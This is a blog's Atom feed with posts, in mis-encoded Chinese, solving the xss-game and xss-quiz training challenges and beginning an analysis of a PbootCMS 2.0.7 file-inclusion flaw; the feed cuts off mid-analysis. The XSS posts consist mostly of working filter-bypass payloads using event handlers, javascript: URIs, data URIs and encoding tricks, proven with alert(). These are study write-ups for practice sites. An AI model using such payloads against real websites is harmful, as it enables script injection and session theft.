<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kath4rs1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-22T02:39:00.355Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Katharsis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xssä»é›¶å¼€å§‹ä¹‹åˆ·xss-game</title>
    <link href="http://yoursite.com/2020/09/22/xss-game/"/>
    <id>http://yoursite.com/2020/09/22/xss-game/</id>
    <published>2020-09-22T01:13:22.000Z</published>
    <updated>2020-09-22T02:39:00.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ·é¢˜"><a href="#åˆ·é¢˜" class="headerlink" title="åˆ·é¢˜"></a>åˆ·é¢˜</h2><p>å¹³å°åœ°å€ï¼š<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><a id="more"></a><h3 id="Level-1-Hello-world-of-XSS"><a href="#Level-1-Hello-world-of-XSS" class="headerlink" title="Level 1: Hello, world of XSS"></a>Level 1: Hello, world of XSS</h3><p>payload : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-2-Persistence-is-key"><a href="#Level-2-Persistence-is-key" class="headerlink" title="Level 2: Persistence is key"></a>Level 2: Persistence is key</h3><p>è¿‡æ»¤äº†scriptæ ‡ç­¾ï¼Œä½¿ç”¨img+äº‹ä»¶ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-3-That-sinking-feelingâ€¦"><a href="#Level-3-That-sinking-feelingâ€¦" class="headerlink" title="Level 3: That sinking feelingâ€¦"></a>Level 3: That sinking feelingâ€¦</h3><p>è¿™é‡Œç”¨åˆ°äº† <code>location.hash</code> ï¼Œlocationæ˜¯javascripté‡Œè¾¹ç®¡ç†åœ°å€æ çš„å†…ç½®å¯¹è±¡ï¼Œæ¯”å¦‚location.hrefå°±ç®¡ç†é¡µé¢çš„urlï¼Œç”¨location.href=urlå°±å¯ä»¥ç›´æ¥å°†é¡µé¢é‡å®šå‘urlã€‚è€Œlocation.hashåˆ™å¯ä»¥ç”¨æ¥è·å–æˆ–è®¾ç½®é¡µé¢çš„æ ‡ç­¾å€¼ï¼Œæ¯”å¦‚<a href="http://domain/#admin">http://domain/#admin</a> çš„location.hash=â€#adminâ€ã€‚åœ¨è®¿é—®é¡µé¢çš„æ—¶å€™ï¼Œé€šè¿‡window.location.hashæ¥åˆ¤æ–­ç”¨æˆ·éœ€è¦è®¿é—®çš„é¡µé¢ï¼Œç„¶åé€šè¿‡javascriptæ¥è°ƒæ•´æ˜¾ç¤ºé¡µé¢ï¼Œæ¯”å¦‚åšå®¢ä¸­ç”¨åˆ°çš„ç›®å½•+æ ‡é¢˜å°±æ˜¯è¿™æ ·çš„ã€‚<br>ç®€å•è§‚å¯Ÿå°±å¯ä»¥å‘ç°#åé¢çš„ä½ç½®å­˜åœ¨æ³¨å…¥ï¼Œå…ˆä½¿ç”¨é—­åˆå•å¼•å·ï¼Œç„¶åå†åŠ å…¥å¼¹çª—äº‹ä»¶ï¼Œ<br>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#39; onerror&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure><h3 id="Level-4-Context-matters"><a href="#Level-4-Context-matters" class="headerlink" title="Level 4: Context matters"></a>Level 4: Context matters</h3><p>è¿™é‡Œæœ‰ä¸€ä¸ªå»¶æ—¶å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;static&#x2F;loading.gif&quot; onload&#x3D;&quot;startTimer(&#39;60&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>æ€è·¯æ˜¯åœ¨onloadä¸­æ„é€ è¯­å¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†åˆ†å·ï¼Œå¯ä»¥ä½¿ç”¨urlç¼–ç ç»•è¿‡<br>ä¸‹é¢è¿™ä¸‰ä¸ªéƒ½å¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;)%3balert(&#39;1</span><br><span class="line">1&#39;||alert(&#39;1</span><br><span class="line">1&#39;)%3balert(1)%3b&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Level-5-Breaking-protocol"><a href="#Level-5-Breaking-protocol" class="headerlink" title="Level 5: Breaking protocol"></a>Level 5: Breaking protocol</h3><p>å‘ç°åœ¨nextå‚æ•°å¤„å­˜åœ¨æ³¨å…¥ï¼Œä¼šæŠŠå‚æ•°ä¼ é€’ç»™ä¸€ä¸ªaæ ‡ç­¾çš„srcå±æ€§ä¸­ï¼Œåœ¨srcä¸­ä½¿ç”¨javascriptä¼ªåè®®ï¼Œ<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next&#x3D;javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="Level-6-Follow-the-ğŸ‡"><a href="#Level-6-Follow-the-ğŸ‡" class="headerlink" title="Level 6: Follow the ğŸ‡"></a>Level 6: Follow the ğŸ‡</h3><p>ä¼ å…¥çš„å‚æ•°ä¼šè¢«æ”¾åœ¨scriptæ ‡ç­¾çš„srcå±æ€§ä¸­ï¼Œä¼šå¼•å…¥ä¸€ä¸ªjsè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;static&#x2F;gadget.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;111&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Data URI Schemeæ‰§è¡Œjsä»£ç <br><a href="https://www.cnblogs.com/fsjohnhuang/p/3903688.html">JSé­”æ³•å ‚ï¼šData URI Schemeä»‹ç»</a><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level6&#x2F;frame#data:text&#x2F;javascript,alert(1);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;åˆ·é¢˜&quot;&gt;&lt;a href=&quot;#åˆ·é¢˜&quot; class=&quot;headerlink&quot; title=&quot;åˆ·é¢˜&quot;&gt;&lt;/a&gt;åˆ·é¢˜&lt;/h2&gt;&lt;p&gt;å¹³å°åœ°å€ï¼š&lt;a href=&quot;https://xss-game.appspot.com/&quot;&gt;https://xss-game.appspot.com/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xssä»é›¶å¼€å§‹ä¹‹åˆ·xss-quiz</title>
    <link href="http://yoursite.com/2020/09/17/xss-challenges/"/>
    <id>http://yoursite.com/2020/09/17/xss-challenges/</id>
    <published>2020-09-17T10:49:55.000Z</published>
    <updated>2020-09-22T02:38:59.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ·é¢˜"><a href="#åˆ·é¢˜" class="headerlink" title="åˆ·é¢˜"></a>åˆ·é¢˜</h2><p>å¹³å°åœ°å€ï¼š<a href="http://xss-quiz.int21h.jp/">xss-quiz</a></p><a id="more"></a><h3 id="chanllenge1"><a href="#chanllenge1" class="headerlink" title="chanllenge1"></a>chanllenge1</h3><p>å¾ˆç®€å•ï¼Œç›´æ¥æ”¾payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>è¾“å…¥ç¬¬ä¸€é¢˜payloadæ²¡ååº”ï¼ŒæŸ¥çœ‹æºä»£ç </p><p><img src="images/xss-challenges/20200917185937.png" alt=""></p><p>å‘ç°è¢«åµŒå…¥åœ¨inputæ ‡ç­¾ä¸­æ‰€ä»¥ä¸ä¼šè§£æï¼Œéœ€è¦æ„é€ ä¸€ä¸‹ï¼Œä½¿å…¶é€ƒé€¸å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><p><img src="images/xss-challenges/20200917190303.png" alt=""></p><h3 id="challenge3-å…¶å®ƒinputæ¡†çš„xss"><a href="#challenge3-å…¶å®ƒinputæ¡†çš„xss" class="headerlink" title="challenge3 å…¶å®ƒinputæ¡†çš„xss"></a>challenge3 å…¶å®ƒinputæ¡†çš„xss</h3><p><img src="images/xss-challenges/20200917190428.png" alt=""></p><p>è¾“å…¥payloadæ²¡ååº”ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°ä¼šè¢«è½¬ä¹‰ï¼ŒæŠ“åŒ…å‘ç°p2å‚æ•°ï¼Œåœ¨p2å‚æ•°å¤„xssï¼ŒæˆåŠŸè¿›å…¥ä¸‹ä¸€å…³</p><h3 id="challenge4-éšè—inputæ¡†çš„xss"><a href="#challenge4-éšè—inputæ¡†çš„xss" class="headerlink" title="challenge4 éšè—inputæ¡†çš„xss"></a>challenge4 éšè—inputæ¡†çš„xss</h3><p>å‘ç°p1,p2å‚æ•°éƒ½è¢«è½¬ä¹‰äº†ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°éšè—è¾“å…¥æ¡†</p><p><img src="images/xss-challenges/20200917190917.png" alt=""></p><p>æŠŠhiddenæ”¹ä¸ºtextï¼Œè¾“å…¥ç¬¬äºŒå…³payloadæˆåŠŸå¼¹çª—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="images/xss-challenges/20200917191306.png" alt=""></p><h3 id="challenge5-å‰ç«¯é•¿åº¦é™åˆ¶çš„xss"><a href="#challenge5-å‰ç«¯é•¿åº¦é™åˆ¶çš„xss" class="headerlink" title="challenge5 å‰ç«¯é•¿åº¦é™åˆ¶çš„xss"></a>challenge5 å‰ç«¯é•¿åº¦é™åˆ¶çš„xss</h3><p>éšä¾¿è¾“å…¥å‘ç°é•¿åº¦é™åˆ¶ä¸º15<br><img src="images/xss-challenges/20200917191618.png" alt=""></p><p>ç›´æ¥ä¿®æ”¹15ä¸ºå…¶ä»–å¤§æ•°ï¼Œç„¶åè¾“å…¥payloadæäº¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="images/xss-challenges/20200917191547.png" alt=""></p><h3 id="challenge6-onäº‹ä»¶bypasså°–æ‹¬å·"><a href="#challenge6-onäº‹ä»¶bypasså°–æ‹¬å·" class="headerlink" title="challenge6 onäº‹ä»¶bypasså°–æ‹¬å·"></a>challenge6 onäº‹ä»¶bypasså°–æ‹¬å·</h3><p>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œéœ€è¦ç»•è¿‡ï¼Œæ³¨æ„æŸ¥çœ‹å…ƒç´ æ„é€ Payload:<br>ç§»åŠ¨é¼ æ ‡è§¦å‘äº‹ä»¶ï¼š<code>&quot;onmouseover=&quot;alert(document.domain)&quot;</code><br>é¼ æ ‡ç‚¹å‡»è§¦å‘äº‹ä»¶ï¼š<code>&quot;onclick=&quot;alert(document.domain)&quot;</code></p><h3 id="challenge7-ä¸ä½¿ç”¨å¼•å·ç»•è¿‡å¼•å·"><a href="#challenge7-ä¸ä½¿ç”¨å¼•å·ç»•è¿‡å¼•å·" class="headerlink" title="challenge7 ä¸ä½¿ç”¨å¼•å·ç»•è¿‡å¼•å·"></a>challenge7 ä¸ä½¿ç”¨å¼•å·ç»•è¿‡å¼•å·</h3><p>å‘ç°å¼•å·è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨ç©ºæ ¼åˆ†éš”å±æ€§ï¼Œä¸ä½¿ç”¨â€,ä»è€Œç»•è¿‡â€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test onmouseover&#x3D;alert(document.domain)</span><br></pre></td></tr></table></figure><h3 id="challenge8-javascriptä¼ªåè®®"><a href="#challenge8-javascriptä¼ªåè®®" class="headerlink" title="challenge8 javascriptä¼ªåè®®"></a>challenge8 javascriptä¼ªåè®®</h3><p>æ¶¨å§¿åŠ¿äº†ï¼Œè¿˜å¯ä»¥è¿™æ ·ç”¨ï¼Œè¾“å‡ºåœ¨hrefä¸‹æ—¶ï¼Œä½¿ç”¨javascriptä¼ªåè®®<br>å¸¸è§ç”¨åˆ°å¨èƒçš„å±æ€§å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">href</span><br><span class="line">backgroud</span><br></pre></td></tr></table></figure><p>bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure><p>ç­‰ä»·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert%28document.domain%29;</span><br></pre></td></tr></table></figure><h3 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h3><p>å¥½åƒæœ‰é—®é¢˜ï¼Œè·³è¿‡</p><h3 id="challenge10-åŒå†™ç»•è¿‡"><a href="#challenge10-åŒå†™ç»•è¿‡" class="headerlink" title="challenge10 åŒå†™ç»•è¿‡"></a>challenge10 åŒå†™ç»•è¿‡</h3><p>æŠŠdomainç½®æ¢ä¸ºç©ºï¼Œç›´æ¥åŒå†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><h3 id="challenge11-ç¼–ç ç»•è¿‡"><a href="#challenge11-ç¼–ç ç»•è¿‡" class="headerlink" title="challenge11 ç¼–ç ç»•è¿‡"></a>challenge11 ç¼–ç ç»•è¿‡</h3><p>è¿‡æ»¤äº†å¾ˆå¤šï¼Œscriptä¼šè¢«æ›¿æ¢ä¸ºxscriptï¼Œonäº‹ä»¶ä¼šè¢«æ›¿æ¢ä¸ºonxxxï¼Œstyleä¼šè¢«æ›¿æ¢ä¸ºstxxx<br>ä½¿ç”¨htmlç¼–ç ç»•è¿‡æ„é€ scriptè¿‡æ»¤ï¼Œä½†æ˜¯ç›´æ¥æ„é€ <code>&lt;scr&amp;#105;p\&gt;</code>ä¸ä¼šè§£ç ï¼Œhtmlç¼–ç è§£æåªå¯¹æ ‡ç­¾é‡Œé¢å±æ€§çš„å€¼è¿›è¡Œè§£ç <br>å¯ä»¥ä½¿ç”¨aæ ‡ç­¾ä¸­çš„href+ä¼ªåè®®æŠŠä»–æ”¾åœ¨å±æ€§ä¸­æ„é€ <br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="challenge15-document-write"><a href="#challenge15-document-write" class="headerlink" title="challenge15 document.write()"></a>challenge15 document.write()</h3><p>å°–æ‹¬å·å’Œå¼•å·è¢«è¿‡æ»¤ï¼Œä½†åœ¨inputæ ‡ç­¾ä¹‹ä¸Šå¼•ç”¨äº†document.writeçš„æ–¹æ³•<br>write() æ–¹æ³•å¯å‘æ–‡æ¡£å†™å…¥ HTML è¡¨è¾¾å¼æˆ– JavaScript ä»£ç ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨writeä¸­å†™å…¥çš„ä»£ç å°±æ˜¯jsçš„èŒƒç•´äº†ï¼Œåœ¨jsä¸­å¯ä»¥ä½¿ç”¨unicodeç¼–ç æˆ–è€…åå…­è¿›åˆ¶ç¼–ç ï¼Œdocument.writeåœ¨è¾“å‡ºçš„æ—¶å€™ä¼šè§£ç ä¸€ä¸‹æ•°æ®ï¼ŒæŠŠunicodeç¼–ç çš„å­—ç¬¦è½¬æ¢æˆå®ä½“å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain);\\u003c&#x2F;script\\u003e</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c&#x2F;script\\x3e</span><br></pre></td></tr></table></figure><p>ä¸€ç§æ˜¯unnicodeç¼–ç ï¼Œä¸€ç§æ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œéƒ½å¯ä»¥ç»•è¿‡ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»ç»“ä¸€ä¸‹ï¼Œè°ƒç”¨jsçš„æ–¹å¼ï¼šä¸€äº›onäº‹ä»¶ï¼Œå¦‚:onmouseoverã€onclickã€onerrorç­‰ç­‰ã€‚<br>å¦‚æœæ˜¯æ ‡ç­¾çš„è¯ï¼Œè¦è„±ç¦»å…¶å®ƒæ ‡ç­¾æ‰èƒ½å¼€å¯jsè§£æè°ƒç”¨ã€‚<br>è¿˜æœ‰å°±æ˜¯ä¸€äº›ç‰¹å®šçš„æ–¹æ³•ï¼Œæ¯”å¦‚document.writeã€‚<br>å­¦ä¼šæ„é€ ã€å­¦ä¼šç”¨javascriptä¼ªåè®®ï¼Œå­¦ä¼šç¼–ç ç»•è¿‡ï¼ŒçŸ¥é“æµè§ˆå™¨è§£æçš„é¡ºåº</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;åˆ·é¢˜&quot;&gt;&lt;a href=&quot;#åˆ·é¢˜&quot; class=&quot;headerlink&quot; title=&quot;åˆ·é¢˜&quot;&gt;&lt;/a&gt;åˆ·é¢˜&lt;/h2&gt;&lt;p&gt;å¹³å°åœ°å€ï¼š&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;xss-quiz&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>PbootCMS2.0.7å‰å°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°</title>
    <link href="http://yoursite.com/2020/09/16/PbootCMS-2-0-7/"/>
    <id>http://yoursite.com/2020/09/16/PbootCMS-2-0-7/</id>
    <published>2020-09-16T11:54:18.000Z</published>
    <updated>2020-09-16T13:03:00.723Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰çœ‹åˆ°ç½‘ä¸Šæœ‰å…³äºè¿™ä¸ªæ¼æ´åˆ†æçš„æ–‡ç« ï¼Œè¿™ä¸¤å¤©æ²¡ä»€ä¹ˆäº‹æƒ…åšå°±æƒ³ç€è‡ªå·±ä¹Ÿçœ‹ä¸€çœ‹ï¼Œåˆ†ææ¼æ´çš„æˆå› ï¼Œå¤ç°ä¸€ä¸‹ã€‚<br>å…ˆåœ¨githubä¸Šé¢ä¸‹è½½å¥½å¯¹åº”ç‰ˆæœ¬çš„æºç ï¼Œphpstudyä¸€æŠŠæ¢­ã€‚</p><a id="more"></a><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è§¦å‘æ–‡ä»¶åŒ…å«çš„åœ°æ–¹åœ¨ <strong>core\view\View.php</strong> æ–‡ä»¶çš„viewç±»ä¸­ï¼Œç›´æ¥çœ‹è¿™ä¸ªæ–¹æ³•å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public function parser($file)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; è®¾ç½®ä¸»é¢˜</span><br><span class="line">    $theme &#x3D; isset($this-&gt;vars[&#39;theme&#39;]) ? $this-&gt;vars[&#39;theme&#39;] : &#39;default&#39;;</span><br><span class="line">    </span><br><span class="line">    $theme &#x3D; preg_replace(&#39;&#x2F;\.\.(\&#x2F;|\\\)&#x2F;&#39;, &#39;&#39;, $theme); &#x2F;&#x2F; è¿‡æ»¤æ‰ç›¸å¯¹è·¯å¾„</span><br><span class="line">    $file &#x3D; preg_replace(&#39;&#x2F;\.\.(\&#x2F;|\\\)&#x2F;&#39;, &#39;&#39;, $file); &#x2F;&#x2F; è¿‡æ»¤æ‰ç›¸å¯¹è·¯å¾„</span><br><span class="line"></span><br><span class="line">    if (strpos($file, &#39;&#x2F;&#39;) &#x3D;&#x3D;&#x3D; 0) &#123; &#x2F;&#x2F; ç»å¯¹è·¯å¾„æ¨¡æ¿</span><br><span class="line">        $tpl_file &#x3D; ROOT_PATH . $file;</span><br><span class="line">    &#125; elseif (! ! $pos &#x3D; strpos($file, &#39;@&#39;)) &#123; &#x2F;&#x2F; è·¨æ¨¡å—è°ƒç”¨</span><br><span class="line">        $path &#x3D; APP_PATH . &#39;&#x2F;&#39; . substr($file, 0, $pos) . &#39;&#x2F;view&#x2F;&#39; . $theme;</span><br><span class="line">        define(&#39;APP_THEME_DIR&#39;, str_replace(DOC_PATH, &#39;&#39;, $path));</span><br><span class="line">        if (! is_dir($path)) &#123; &#x2F;&#x2F; æ£€æŸ¥ä¸»é¢˜æ˜¯å¦å­˜åœ¨</span><br><span class="line">            error(&#39;æ¨¡æ¿ä¸»é¢˜ç›®å½•ä¸å­˜åœ¨ï¼ä¸»é¢˜è·¯å¾„ï¼š&#39; . $path);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;tplPath &#x3D; $path;</span><br><span class="line">        &#125;</span><br><span class="line">        $tpl_file &#x3D; $path . &#39;&#x2F;&#39; . substr($file, $pos + 1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; å®šä¹‰å½“å‰åº”ç”¨ä¸»é¢˜ç›®å½•</span><br><span class="line">        define(&#39;APP_THEME_DIR&#39;, str_replace(DOC_PATH, &#39;&#39;, APP_VIEW_PATH) . &#39;&#x2F;&#39; . $theme);</span><br><span class="line">        if (! is_dir($this-&gt;tplPath .&#x3D; &#39;&#x2F;&#39; . $theme)) &#123; &#x2F;&#x2F; æ£€æŸ¥ä¸»é¢˜æ˜¯å¦å­˜åœ¨</span><br><span class="line">            error(&#39;æ¨¡æ¿ä¸»é¢˜ç›®å½•ä¸å­˜åœ¨ï¼ä¸»é¢˜è·¯å¾„ï¼š&#39; . APP_THEME_DIR);</span><br><span class="line">        &#125;</span><br><span class="line">        $tpl_file &#x3D; $this-&gt;tplPath . &#39;&#x2F;&#39; . $file; &#x2F;&#x2F; æ¨¡æ¿æ–‡ä»¶</span><br><span class="line">    &#125;</span><br><span class="line">    $note &#x3D; Config::get(&#39;tpl_html_dir&#39;) ? &#39;&lt;br&gt;åŒæ—¶æ£€æµ‹åˆ°æ‚¨ç³»ç»Ÿä¸­å¯ç”¨äº†æ¨¡æ¿å­ç›®å½•&#39; . Config::get(&#39;tpl_html_dir&#39;) . &#39;ï¼Œè¯·æ ¸å¯¹æ˜¯å¦æ˜¯æ­¤åŸå› å¯¼è‡´ï¼&#39; : &#39;&#39;;</span><br><span class="line">    file_exists($tpl_file) ?: error(&#39;æ¨¡æ¿æ–‡ä»¶&#39; . APP_THEME_DIR . &#39;&#x2F;&#39; . $file . &#39;ä¸å­˜åœ¨ï¼&#39; . $note);</span><br><span class="line">    $tpl_c_file &#x3D; $this-&gt;tplcPath . &#39;&#x2F;&#39; . md5($tpl_file) . &#39;.php&#39;; &#x2F;&#x2F; ç¼–è¯‘æ–‡ä»¶</span><br><span class="line">                                                                   </span><br><span class="line">    &#x2F;&#x2F; å½“ç¼–è¯‘æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–è€…æ¨¡æ¿æ–‡ä»¶ä¿®æ”¹è¿‡ï¼Œåˆ™é‡æ–°ç”Ÿæˆç¼–è¯‘æ–‡ä»¶</span><br><span class="line">    if (! file_exists($tpl_c_file) || filemtime($tpl_c_file) &lt; filemtime($tpl_file) || ! Config::get(&#39;tpl_parser_cache&#39;)) &#123;</span><br><span class="line">        $content &#x3D; Parser::compile($this-&gt;tplPath, $tpl_file); &#x2F;&#x2F; è§£ææ¨¡æ¿</span><br><span class="line">        file_put_contents($tpl_c_file, $content) ?: error(&#39;ç¼–è¯‘æ–‡ä»¶&#39; . $tpl_c_file . &#39;ç”Ÿæˆå‡ºé”™ï¼è¯·æ£€æŸ¥ç›®å½•æ˜¯å¦æœ‰å¯å†™æƒé™ï¼&#39;); &#x2F;&#x2F; å†™å…¥ç¼–è¯‘æ–‡ä»¶</span><br><span class="line">        $compile &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ob_start(); &#x2F;&#x2F; å¼€å¯ç¼“å†²åŒº,å¼•å…¥ç¼–è¯‘æ–‡ä»¶</span><br><span class="line">    $rs &#x3D; include $tpl_c_file;</span><br><span class="line">    if (! isset($compile)) &#123;</span><br><span class="line">        foreach ($rs as $value) &#123; &#x2F;&#x2F; æ£€æŸ¥åŒ…å«æ–‡ä»¶æ˜¯å¦æ›´æ–°,å…¶ä¸­ä¸€ä¸ªåŒ…å«æ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¿®æ”¹åˆ™é‡æ–°è§£ææ¨¡æ¿</span><br><span class="line">            if (! file_exists($value) || filemtime($tpl_c_file) &lt; filemtime($value) || ! Config::get(&#39;tpl_parser_cache&#39;)) &#123;</span><br><span class="line">                $content &#x3D; Parser::compile($this-&gt;tplPath, $tpl_file); &#x2F;&#x2F; è§£ææ¨¡æ¿</span><br><span class="line">                file_put_contents($tpl_c_file, $content) ?: error(&#39;ç¼–è¯‘æ–‡ä»¶&#39; . $tpl_c_file . &#39;ç”Ÿæˆå‡ºé”™ï¼è¯·æ£€æŸ¥ç›®å½•æ˜¯å¦æœ‰å¯å†™æƒé™ï¼&#39;); &#x2F;&#x2F; å†™å…¥ç¼–è¯‘æ–‡ä»¶</span><br><span class="line">                ob_clean();</span><br><span class="line">                include $tpl_c_file;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $content &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´è§¦å‘çš„åŸå› 